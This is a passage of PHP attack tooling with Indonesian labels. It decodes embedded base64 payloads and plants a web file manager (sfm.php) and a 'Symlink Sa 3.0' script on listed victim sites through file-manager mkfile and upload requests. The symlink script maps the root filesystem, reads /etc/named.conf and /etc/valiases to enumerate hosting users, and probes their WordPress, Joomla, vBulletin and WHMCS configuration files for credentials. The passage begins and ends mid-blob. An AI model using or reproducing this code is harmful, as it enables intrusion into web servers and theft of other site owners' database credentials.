QUNINUJBSG9Bd0lBTEFBQUFBQVJBQTBBQUFJc2xJK3BBdTJ3REFpejBqV0QzaHFtQnpaZjFWQ2xlSlFjaDBya2RucHBCM2RLWnVJeWdyTVJFL29KRHdVQU93QT0nKTsNCgljYXNlICdhcnJvdyc6DQoJCXJldHVybiBiYXNlNjRfZGVjb2RlKCdSMGxHT0RsaEVRQU5BSUFCQUFBQUFQLy8veUg1QkFFS0FBRUFMQUFBQUFBUkFBMEFBQUlkakE5d3k2Z05RNHB3VW1hdjB5dm4raGhKaUkzbUNKNm90cklreHhRQU93PT0nKTsNCgl9DQp9DQoNCmZ1bmN0aW9uIGh0bWxfaGVhZGVyICgpIHsNCglnbG9iYWwgJHNpdGVfY2hhcnNldDsNCg0KCWVjaG8gPDw8RU5EDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBTdHJpY3QvL0VOIg0KICAgICAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtc3RyaWN0LmR0ZCI+DQo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+DQo8aGVhZD4NCg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9JHNpdGVfY2hhcnNldCIgLz4NCg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmh0bWwgew0KCSBiYWNrZ3JvdW5kOiB1cmwoaHR0cHM6Ly9zY29udGVudC1zaXQ0LTEueHguZmJjZG4ubmV0L3YvdDEuMC0wL3E4NS9zMzUweDM1MC8xNDQ1MDAxNl8xNjg3MzU4MzA0OTE4NzAwXzQ4NjUxMjcwODM3MDkxODIxMzlfbi5qcGc/b2g9ZGU0YmY4YTY3OTEyN2Y0MTJmNDdjZjQ2ODIzOTg4ZGEmb2U9NTkyMTQ3RDMpIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyIGZpeGVkOyANCiAgLXdlYmtpdC1iYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KICAtbW96LWJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogIC1vLWJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogIGJhY2tncm91bmQtc2l6ZTogY292ZXI7DQp9DQpib2R5IHsgZm9udDogc21hbGwgc2Fucy1zZXJpZjsgdGV4dC1hbGlnbjogY2VudGVyIH0NCmltZyB7IHdpZHRoOiAxN3B4OyBoZWlnaHQ6IDEzcHggfQ0KYSwgYTp2aXNpdGVkIHsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyBjb2xvcjogbmF2eSB9DQpociB7IGJvcmRlci1zdHlsZTogbm9uZTsgaGVpZ2h0OiAxcHg7IGJhY2tncm91bmQtY29sb3I6IHNpbHZlcjsgY29sb3I6IHNpbHZlciB9DQojbWFpbiB7IG1hcmdpbi10b3A6IDZwdDsgbWFyZ2luLWxlZnQ6IGF1dG87IG1hcmdpbi1yaWdodDogYXV0bzsgYm9yZGVyLXNwYWNpbmc6IDFweCB9DQojbWFpbiB0aCB7IGJhY2tncm91bmQ6ICNlZWU7IHBhZGRpbmc6IDNwdCAzcHQgMHB0IDNwdCB9DQoubGlzdGluZyB0aCwgLmxpc3RpbmcgdGQgeyBwYWRkaW5nOiAxcHggM3B0IDAgM3B0IDtib3gtc2hhZG93OiAwcHggMHB4IDE1cHggeWVsbG93O30NCi5saXN0aW5nIHRoIHsgYm9yZGVyOiAxcHggc29saWQgc2lsdmVyIDtib3gtc2hhZG93OiAwcHggMHB4IDE1cHggeWVsbG93O30NCi5saXN0aW5nIHRkIHsgYm9yZGVyOiAxcHggc29saWQgI2RkZDsgYmFja2dyb3VuZDogYmxhY2sgfQ0KLmxpc3RpbmcgLmNoZWNrYm94IHsgdGV4dC1hbGlnbjogY2VudGVyIH0NCi5saXN0aW5nIC5maWxlbmFtZSB7IHRleHQtYWxpZ246IGxlZnQgO2JveC1zaGFkb3c6IDBweCAwcHggMTVweCBsaW1lO30NCi5saXN0aW5nIC5zaXplIHsgdGV4dC1hbGlnbjogcmlnaHQgfQ0KLmxpc3RpbmcgLnBlcm1pc3Npb25faGVhZGVyIHsgdGV4dC1hbGlnbjogbGVmdH0NCi5saXN0aW5nIC5wZXJtaXNzaW9uIHsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZX0NCi5saXN0aW5nIC5vd25lciB7IHRleHQtYWxpZ246IGxlZnQgfQ0KLmxpc3RpbmcgLmdyb3VwIHsgdGV4dC1hbGlnbjogbGVmdCB9DQoubGlzdGluZyAuZnVuY3Rpb25zIHsgdGV4dC1hbGlnbjogbGVmdCB9DQoubGlzdGluZ19mb290ZXIgdGQgeyBiYWNrZ3JvdW5kOiAjZWVlOyBib3JkZXI6IDFweCBzb2xpZCBzaWx2ZXIgfQ0KI2RpcmVjdG9yeSwgI3VwbG9hZCwgI2NyZWF0ZSwgLmxpc3RpbmdfZm9vdGVyIHRkLCAjZXJyb3IgdGQsICNub3RpY2UgdGQgeyB0ZXh0LWFsaWduOiBsZWZ0OyBwYWRkaW5nOiAzcHQgfQ0KI2RpcmVjdG9yeSB7IGJhY2tncm91bmQ6ICNlZWU7IGJvcmRlcjogMXB4IHNvbGlkIHNpbHZlciB9DQojdXBsb2FkIHsgcGFkZGluZy10b3A6IDFlbSB9DQojY3JlYXRlIHsgcGFkZGluZy1ib3R0b206IDFlbSB9DQouc21hbGwsIC5zbWFsbCBvcHRpb24geyBmb250LXNpemU6IHgtc21hbGwgfQ0KdGV4dGFyZWEgeyBib3JkZXI6IG5vbmU7IGJhY2tncm91bmQ6IGxpbWUgfQ0KdGFibGUuZGlhbG9nIHsgbWFyZ2luLWxlZnQ6IGF1dG87IG1hcmdpbi1yaWdodDogYXV0byB9DQp0ZC5kaWFsb2cgeyBiYWNrZ3JvdW5kOiAjZWVlOyBwYWRkaW5nOiAxZXg7IGJvcmRlcjogMXB4IHNvbGlkIHNpbHZlcjsgdGV4dC1hbGlnbjogY2VudGVyIH0NCiNwZXJtaXNzaW9uIHsgbWFyZ2luLWxlZnQ6IGF1dG87IG1hcmdpbi1yaWdodDogYXV0byB9DQojcGVybWlzc2lvbiB0ZCB7IHBhZGRpbmctbGVmdDogM3B0OyBwYWRkaW5nLXJpZ2h0OiAzcHQ7IHRleHQtYWxpZ246IGNlbnRlciB9DQp0ZC5wZXJtaXNzaW9uX2FjdGlvbiB7IHRleHQtYWxpZ246IHJpZ2h0IH0NCiNzeW1saW5rIHsgYmFja2dyb3VuZDogI2VlZTsgYm9yZGVyOiAxcHggc29saWQgc2lsdmVyIH0NCiNzeW1saW5rIHRkIHsgdGV4dC1hbGlnbjogbGVmdDsgcGFkZGluZzogM3B0IH0NCiNyZWRfYnV0dG9uIHsgd2lkdGg6IDEyMHB4OyBjb2xvcjogIzQwMCB9DQojZ3JlZW5fYnV0dG9uIHsgd2lkdGg6IDEyMHB4OyBjb2xvcjogIzA0MCB9DQojZXJyb3IgdGQgeyBiYWNrZ3JvdW5kOiBtYXJvb247IGNvbG9yOiB3aGl0ZTsgYm9yZGVyOiAxcHggc29saWQgc2lsdmVyIH0NCiNub3RpY2UgdGQgeyBiYWNrZ3JvdW5kOiBncmVlbjsgY29sb3I6IHdoaXRlOyBib3JkZXI6IDFweCBzb2xpZCBzaWx2ZXIgfQ0KI25vdGljZSBwcmUsICNlcnJvciBwcmUgeyBiYWNrZ3JvdW5kOiBzaWx2ZXI7IGNvbG9yOiBibGFjazsgcGFkZGluZzogMWV4OyBtYXJnaW4tbGVmdDogMWV4OyBtYXJnaW4tcmlnaHQ6IDFleCB9DQpjb2RlIHsgZm9udC1zaXplOiAxMnB0IH0NCnRkIHsgd2hpdGUtc3BhY2U6IG5vd3JhcCB9DQojbWVudSBhew0KCXBhZGRpbmc6NHB4IDIwcHg7DQoJICAgYm9yZGVyOiAxcHggc29saWQgd2hpdGU7Ym94LXNoYWRvdzogMHB4IDBweCAxNXB4IHJlZDsNCgltYXJnaW46MDsNCglsZXR0ZXItc3BhY2luZzoycHg7DQoJCXdpZHRoOiAxMDAlOw0KCWhlaWdodDogMTcwcHg7DQp9DQo8L3N0eWxlPg0KDQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQo8IS0tDQpmdW5jdGlvbiBhY3RpdmF0ZSAobmFtZSkgew0KCWlmIChkb2N1bWVudCAmJiBkb2N1bWVudC5mb3Jtc1swXSAmJiBkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1snZm9jdXMnXSkgew0KCQlkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1snZm9jdXMnXS52YWx1ZSA9IG5hbWU7DQoJfQ0KfQ0KLy8tLT4NCjwvc2NyaXB0Pg0KDQo8L2hlYWQ+DQo8Ym9keT4NCkVORDsNCn0NCmZ1bmN0aW9uIGh0bWxfZm9vdGVyICgpIHsNCgllY2hvIDw8PEVORA0KPC9ib2R5Pg0KPC9odG1sPg0KRU5EOw0KfQ0KZnVuY3Rpb24gbm90aWNlICgkcGhyYXNlKSB7DQoJZ2xvYmFsICRjb2xzOw0KCSRhcmdzID0gZnVuY19nZXRfYXJncygpOw0KCWFycmF5X3NoaWZ0KCRhcmdzKTsNCglyZXR1cm4gJzx0ciBpZD0ibm90aWNlIj4NCgk8dGQgY29sc3Bhbj0iJyAuICRjb2xzIC4gJyI+JyAuIHBocmFzZSgkcGhyYXNlLCAkYXJncykgLiAnPC90ZD4NCjwvdHI+JzsNCn0NCmZ1bmN0aW9uIGVycm9yICgkcGhyYXNlKSB7DQoJZ2xvYmFsICRjb2xzOw0KCSRhcmdzID0gZnVuY19nZXRfYXJncygpOw0KCWFycmF5X3NoaWZ0KCRhcmdzKTsNCglyZXR1cm4gJzx0ciBpZD0iZXJyb3IiPg0KCTx0ZCBjb2xzcGFuPSInIC4gJGNvbHMgLiAnIj4nIC4gcGhyYXNlKCRwaHJhc2UsICRhcmdzKSAuICc8L3RkPjwvdHI+JzsNCn0NCj8+";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done Simple FileManager By ShadowHearts(sfm.php) berhasil di tanam coba cek<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		} ?>
<form method="post">
<input type="submit" name="f" value="PLANT Symlink Sa. 3.0">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['f']) {
	foreach($target as $korban) {
		$global = "sym.php";
		$isi_nama_doang = "PD9waHANCnNldF90aW1lX2xpbWl0KDApOw0KZXJyb3JfcmVwb3J0aW5nKDApOw0KJHBhZ2VVUkwgPSAnaHR0cDovLycuJF9TRVJWRVJbIlNFUlZFUl9OQU1FIl0uJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQokdSA9IGV4cGxvZGUoIi8iLCRwYWdlVVJMICk7DQokcGFnZVVSTCA9c3RyX3JlcGxhY2UoJHVbY291bnQoJHUpLTFdLCIiLCRwYWdlVVJMICk7DQokcGFnZUZUUCA9ICdmdHA6Ly8nLiRfU0VSVkVSWyJTRVJWRVJfTkFNRSJdLicvcHVibGljX2h0bWwvJy4kX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsNCiR1ID0gZXhwbG9kZSgiLyIsJHBhZ2VGVFAgKTsNCiRwYWdlRlRQID1zdHJfcmVwbGFjZSgkdVtjb3VudCgkdSktMV0sIiIsJHBhZ2VGVFAgKTsNCj8+DQogPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiINCiAgICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS1zdHJpY3QuZHRkIj4NCg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPg0KPGhlYWQ+DQo8dGl0bGU+U3ltbGlua19TYSAzLjA8L3RpdGxlPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCiBodG1sLGJvZHkgew0KICAgIG1hcmdpbjogMDsNCiAgICBwYWRkaW5nOiAwOw0KICAgIG91dGxpbmU6IDA7DQp9DQphew0KDQpmb250LXNpemU6IDEzcHg7DQoNCn0NCg0KDQpib2R5IHsNCiAgIGRpcmVjdGlvbjogbHRyOw0KICAgYmFja2dyb3VuZC1jb2xvcjojRjRGNEY0Ow0KICAgIGNvbG9yOiByZ2IoMTUzLCAxNTMsIDE1Myk7DQogICB0ZXh0LWFsaWduOiBjZW50ZXINCn0NCg0KDQoNCmlucHV0LHRleHRhcmVhLHNlbGVjdHsNCmZvbnQtd2VpZ2h0OiBib2xkOw0KY29sb3I6ICMwMDAwMDA7DQp9DQoNCmlucHV0LHRleHRhcmVhLHNlbGVjdDpob3ZlcnsNCmJveC1zaGFkb3c6IDBweCAwcHggNHB4ICNBQUFBQUE7DQp9DQoNCg0KLmhlZHIgew0KIGZvbnQtZmFtaWx5OiBUYWhvbWEsIEFyaWFsLCBzYW5zLXNlcmlmICA7DQogZm9udC1zaXplOiAyMnB4Ow0KDQoNCn0NCg0KLmNvbnQgYXsNCg0KdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KY29sb3I6cmdiKDE1MywgMTUzLCAxNTMpOw0KZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWYgIDsNCmZvbnQtc2l6ZTogMTZweDsNCnRleHQtc2hhZG93OiAwcHggMHB4IDNweCA7DQp9DQoNCi5jb250IGE6aG92ZXJ7DQoNCg0KIGNvbG9yOiAjRUVFRUVFIDsNCiB0ZXh0LXNoYWRvdzowcHggMHB4IDNweCAjMDAwMDAwIDsNCg0KDQp9DQoNCi50bXAgdHIgdGR7DQoNCmJvcmRlcjogc29saWQgMXB4ICNCQkJCQkI7DQoNCnBhZGRpbmc6IDJweCA7DQogZm9udC1zaXplOiAxM3B4Ow0KfQ0KDQoudG1wIHRyIHRkIGEgew0KIHRleHQtZGVjb3JhdGlvbjogbm9uZTsNCg0KDQoNCn0NCg0KLmZvdGVyew0KIGZvbnQtc2l6ZTogOXB0Ow0KIGNvbG9yOiAjQUFBQUFBIDsNCiB0ZXh0LWFsaWduOiBjZW50ZXINCn0NCg0KLnRtcCB0ciB0ZDpob3ZlcnsNCg0KYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzg4ODg4ODsNCg0KfQ0KLmZvdHsNCg0KZm9udC1mYW1pbHk6VGFob21hLCBBcmlhbCwgc2Fucy1zZXJpZjsNCg0KIGZvbnQtc2l6ZTogMTFwdDsNCn0NCi5mb3IgYSA6IGhvdmVyew0KDQp0ZXh0LXNoYWRvdzogMHB4IDBweCAxcHggIzMzNjZGRjsNCg0KfQ0KDQoNCi5pciB7DQogY29sb3I6ICNGRjAwMDA7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8ZGl2IGNsYXNzPSdhbGwnPg0KPD9waHANCg0KQG1rZGlyKCdzeW0nLDA3NzcpOw0KJGh0Y3MgID0gIk9wdGlvbnMgYWxsIFxuIERpcmVjdG9yeUluZGV4IFN1eC5odG1sIFxuIEFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIFxuIEFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwIFxuICBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsNCiRmID1AZm9wZW4gKCdzeW0vLmh0YWNjZXNzJywndycpOw0KZndyaXRlKCRmICwgJGh0Y3MpOw0KDQoNCg0KQHN5bWxpbmsoIi8iLCJzeW0vcm9vdCIpOw0KDQokcGcgPSBiYXNlbmFtZShfX0ZJTEVfXyk7DQoNCmVjaG8gJzxiciAvPjxkaXYgY2xhc3M9ImhlZHIiPiBTeW1saW5rIFNhIDMuMCA8YnIgLz48L2Rpdj4nIDsNCg0KZWNobyAnPGJyIC8+PGRpdiBjbGFzcz0iaGVkciI+LTpbIFVzZXIgJiBEb21haW5zICYgU3ltbGluayBdOi08YnIgLz48YnIgLz48L2Rpdj4nIDsNCg0KZWNobyAnPGRpdiBjbGFzcz0iY29udCI+DQoNCls8YSBocmVmPSI/Ij4gSG9tZSA8L2E+XQ0KDQpbPGEgaHJlZj0iP3N3cz1zeW0iPiBVc2VyICYgRG9tYWlucyAmIFN5bWxpbmsgPC9hPl0NCg0KWzxhIGhyZWY9Ij9zd3M9c2VjIj4gRG9tYWlucyAmIFNjcmlwdCA8L2E+XQ0KDQpbIDxhIGhyZWY9Ij9zd3M9ZmlsZSI+IFN5bWxpbmsgRmlsZSA8L2E+XQ0KDQpbPGEgaHJlZj0iP3N3cz1wYXNzd2QiPiBTeW1saW5rIEJ5cGFzcyA8L2E+XQ0KDQo8YnIgLz48YnIgLz4NCg0KWyA8YSBocmVmPSI/c3dzPXJlYWQiPiBCeXBhc3MgUmVhZCA8L2E+XQ0KDQpbIDxhIGhyZWY9Ij9zd3M9am9vbWxhIj4gTWFzcyBKb29tbGEgPC9hPl0NCg0KWyA8YSBocmVmPSI/c3dzPXdwIj4gTWFzcyBXb3JkUHJlc3MgPC9hPl0NCg0KWyA8YSBocmVmPSI/c3dzPXZiIj4gTWFzcyB2QnVsbGV0aW4gPC9hPl0NCg0KWyA8YSBocmVmPSI/c3dzPWhlbHAiPiBIZWxwIDwvYT5dDQoNCjxiciAvPjxiciAvPjxiciAvPg0KDQoNCg0KDQoNCg0KPC9kaXY+JzsNCg0KaWYoaXNzZXQoJF9SRVFVRVNUWydzd3MnXSkpDQp7DQoNCnN3aXRjaCAoJF9SRVFVRVNUWydzd3MnXSkNCnsNCg0KDQoNCg0KDQovLy8gRG9tYWlucyArIFNjcmlwdHMgIC8vLw0KDQpjYXNlICdzZWMnOg0KDQppZighQGlzX2ZpbGUoJ25hbWVkLnR4dCcpKXsNCg0KJGQwMG0gPSBAZmlsZSgiL2V0Yy9uYW1lZC5jb25mIik7DQoNCn1lbHNlew0KDQokZDAwbSA9IEBmaWxlKCJuYW1lZC50eHQiKTsNCg0KDQp9DQppZighJGQwMG0pDQp7DQoNCiAgICAgICAgICAgICAgIGRpZSAoIjxtZXRhIGh0dHAtZXF1aXY9J3JlZnJlc2gnIGNvbnRlbnQ9JzA7IHVybD0/c3dzPXJlYWQnLz4iKTsNCn0NCmVsc2UNCg0Kew0KZWNobyAiPGRpdiBjbGFzcz0ndG1wJz4NCjx0YWJsZSBhbGlnbj0nY2VudGVyJyB3aWR0aD0nNDAlJz48dGQ+IERvbWFpbnMgPC90ZD48dGQ+IFNjcmlwdCA8L3RkPiI7DQpmb3JlYWNoKCRkMDBtIGFzICRkb20pew0KDQpmbHVzaCgpOw0KZmx1c2goKTsNCg0KDQoNCmlmKGVyZWdpKCJ6b25lIiwkZG9tKSl7DQoNCkBwcmVnX21hdGNoX2FsbCgnI3pvbmUgIiguKikiIycsICRkb20sICRkb21zd3MpOw0KDQpmbHVzaCgpOw0KDQppZihAc3RybGVuKHRyaW0oJGRvbXN3c1sxXVswXSkpID4gMil7DQoNCiR1c2VyID0gQHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoIi9ldGMvdmFsaWFzZXMvIi4kZG9tc3dzWzFdWzBdKSk7DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQoNCiR3cGw9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAiOw0KJHdwcD1AZ2V0X2hlYWRlcnMoJHdwbCk7DQokd3A9JHdwcFswXTsNCg0KJHdwMj0kcGFnZVVSTC4iL3N5bS9yb290L2hvbWUvIi4kdXNlclsnbmFtZSddLiIvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwIjsNCiR3cHAyPUBnZXRfaGVhZGVycygkd3AyKTsNCiR3cDEyPSR3cHAyWzBdOw0KDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQoNCiRqbzE9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwIjsNCiRqb289QGdldF9oZWFkZXJzKCRqbzEpOw0KJGpvPSRqb29bMF07DQoNCg0KJGpvMj0kcGFnZVVSTC4iL3N5bS9yb290L2hvbWUvIi4kdXNlclsnbmFtZSddLiIvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwIjsNCiRqb28yPUBnZXRfaGVhZGVycygkam8yKTsNCiRqbzEyPSRqb28yWzBdOw0KDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQokdmIxPSRwYWdlVVJMLiIvc3ltL3Jvb3QvaG9tZS8iLiR1c2VyWyduYW1lJ10uIi9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwIjsNCiR2YmI9QGdldF9oZWFkZXJzKCR2YjEpOw0KJHZiPSR2YmJbMF07DQoNCiR2YjI9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAiOw0KJHZiYjI9QGdldF9oZWFkZXJzKCR2YjIpOw0KJHZiMTI9JHZiYjJbMF07DQoNCiR2YjM9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAiOw0KJHZiYjM9QGdldF9oZWFkZXJzKCR2YjMpOw0KJHZiMTM9JHZiYjNbMF07DQoNCi8vLy8vLy8vLy8vLy8vLy8vDQoNCiR3aDE9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4icHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCI7DQokd2hoMj0gQGdldF9oZWFkZXJzKCR3aDEpOw0KJHdoPSR3aGgyWzBdOw0KDQokd2gyPSRwYWdlVVJMLiIvc3ltL3Jvb3QvaG9tZS8iLiR1c2VyWyduYW1lJ10uIi9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwIjsNCiR3aGgyPSBAZ2V0X2hlYWRlcnMoJHdoMik7DQokd2gxMj0kd2hoMlswXTsNCg0KJHdoMz0kcGFnZVVSTC4iL3N5bS9yb290L2hvbWUvIi4kdXNlclsnbmFtZSddLiIvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwIjsNCiR3aGgzPSBAZ2V0X2hlYWRlcnMoJHdoMyk7DQokd2gxMz0kd2hoM1swXTsNCg0KJHdoNT0kcGFnZVVSTC4iL3N5bS9yb290L2hvbWUvIi4kdXNlclsnbmFtZSddLiIvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCI7DQokd2hoNT0gQGdldF9oZWFkZXJzKCR3aDUpOw0KJHdoMTU9JHdoaDVbMF07DQoNCiR3aDQ9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCI7DQokd2hoND0gQGdldF9oZWFkZXJzKCR3aDQpOw0KJHdoMTQ9JHdoaDRbMF07DQoNCg0KDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQovLy8vLy8vLy8vIFdvcmRwcmVzcyAvLy8vLy8vLy8vLy8NCg0KJHBvcyA9IHN0cnBvcygkd3AsICIyMDAiKTsNCiRjb25maWc9IiZuYnNwOyI7DQoNCmlmIChzdHJwb3MoJHdwLCAiMjAwIikgPT0gdHJ1ZSApDQp7DQokY29uZmlnPSI8YSBocmVmPSciLiR3cGwuIicgdGFyZ2V0PSdfYmxhbmsnPldvcmRwcmVzczwvYT4iOw0KfQ0KZWxzZWlmIChzdHJwb3MoJHdwMTIsICIyMDAiKSA9PSB0cnVlKQ0Kew0KICRjb25maWc9IjxhIGhyZWY9JyIuJHdwMi4iJyB0YXJnZXQ9J19ibGFuayc+V29yZHByZXNzPC9hPiI7DQp9DQoNCi8vLy8vLy8vLy8vV0hNQ1MvLy8vLy8vLw0KDQplbHNlaWYgKHN0cnBvcygkam8sICIyMDAiKSAgPT0gdHJ1ZSBhbmQgc3RycG9zKCR3aDE1LCAiMjAwIikgID09IHRydWUgKQ0Kew0KICRjb25maWc9IiA8YSBocmVmPSciLiR3aDUuIicgdGFyZ2V0PSdfYmxhbmsnPldITUNTPC9hPiI7DQoNCn0NCmVsc2VpZiAoc3RycG9zKCR3aDEyLCAiMjAwIikgID09IHRydWUpDQp7DQogJGNvbmZpZyA9IiA8YSBocmVmPSciLiR3aDIuIicgdGFyZ2V0PSdfYmxhbmsnPldITUNTPC9hPiI7DQp9DQoNCmVsc2VpZiAoc3RycG9zKCR3aDEzLCAiMjAwIikgID09IHRydWUpDQp7DQogJGNvbmZpZyA9IiA8YSBocmVmPSciLiR3aDMuIicgdGFyZ2V0PSdfYmxhbmsnPldITUNTPC9hPiI7DQoNCn0NCg0KLy8vLy8vLy8vIEpvb21sYSB0byA0IC8vLy8vLy8vLy8vDQoNCmVsc2VpZiAoc3RycG9zKCRqbywgIjIwMCIpICA9PSB0cnVlKQ0Kew0KICRjb25maWc9IiA8YSBocmVmPSciLiRqbzEuIicgdGFyZ2V0PSdfYmxhbmsnPkpvb21sYTwvYT4iOw0KfQ0KDQplbHNlaWYgKHN0cnBvcygkam8xMiwgIjIwMCIpICA9PSB0cnVlKQ0Kew0KICRjb25maWc9IiA8YSBocmVmPSciLiRqbzIuIicgdGFyZ2V0PSdfYmxhbmsnPkpvb21sYTwvYT4iOw0KfQ0KDQovLy8vLy8vLy8vdkJ1bGxldGluIHRvIDQgLy8vLy8vLy8vLy8NCg0KZWxzZWlmIChzdHJwb3MoJHZiLCAiMjAwIikgID09IHRydWUpDQp7DQogJGNvbmZpZz0iIDxhIGhyZWY9JyIuJHZiMS4iJyB0YXJnZXQ9J19ibGFuayc+dkJ1bGxldGluPC9hPiI7DQp9DQoNCmVsc2VpZiAoc3RycG9zKCR2YjEyLCAiMjAwIikgID09IHRydWUpDQp7DQogJGNvbmZpZz0iIDxhIGhyZWY9JyIuJHZiMi4iJyB0YXJnZXQ9J19ibGFuayc+dkJ1bGxldGluPC9hPiI7DQp9DQoNCmVsc2VpZiAoc3RycG9zKCR2YjEzLCAiMjAwIikgID09IHRydWUpDQp7DQogJGNvbmZpZz0iIDxhIGhyZWY9JyIuJHZiMy4iJyB0YXJnZXQ9J19ibGFuayc+dkJ1bGxldGluPC9hPiI7DQp9DQoNCmVsc2UNCnsNCmNvbnRpbnVlOw0KfQ0KZmx1c2goKTsNCmZsdXNoKCk7DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KDQoNCiRzaXRlID0gJHVzZXJbJ25hbWUnXSA7DQoNCg0KDQpmbHVzaCgpOw0KDQplY2hvICI8dHI+PHRkPjxhIGhyZWY9aHR0cDovL3d3dy4iLiRkb21zd3NbMV1bMF0uIi8+Ii4kZG9tc3dzWzFdWzBdLiI8L2E+PC90ZD4NCjx0ZD4iLiRjb25maWcuIjwvdGQ+PC90cj4iOyBmbHVzaCgpOw0KDQp9DQp9DQp9DQp9DQoNCg0KDQoNCmJyZWFrOw0KDQoNCi8vLyB1c2VyICsgZG9taW5lICsgc3ltbGluayAgLy8vDQoNCmNhc2UgJ3N5bSc6DQoNCmlmKCFpc19maWxlKCduYW1lZC50eHQnKSl7DQoNCiRkMDBtID0gQGZpbGUoIi9ldGMvbmFtZWQuY29uZiIpOw0KDQp9ZWxzZXsNCg0KJGQwMG0gPSBAZmlsZSgibmFtZWQudHh0Iik7DQoNCg0KfQ0KaWYoISRkMDBtKQ0Kew0KDQogICAgICAgICAgICAgICBkaWUgKCI8bWV0YSBodHRwLWVxdWl2PSdyZWZyZXNoJyBjb250ZW50PScwOyB1cmw9P3N3cz1yZWFkJy8+Iik7DQp9DQplbHNlDQoNCnsNCmVjaG8gIjxkaXYgY2xhc3M9J3RtcCc+PHRhYmxlIGFsaWduPSdjZW50ZXInIHdpZHRoPSc0MCUnPjx0ZD5Eb21haW5zPC90ZD48dGQ+VXNlcnM8L3RkPjx0ZD5zeW1saW5rIDwvdGQ+IjsNCmZvcmVhY2goJGQwMG0gYXMgJGRvbSl7DQoNCmlmKGVyZWdpKCJ6b25lIiwkZG9tKSl7DQoNCnByZWdfbW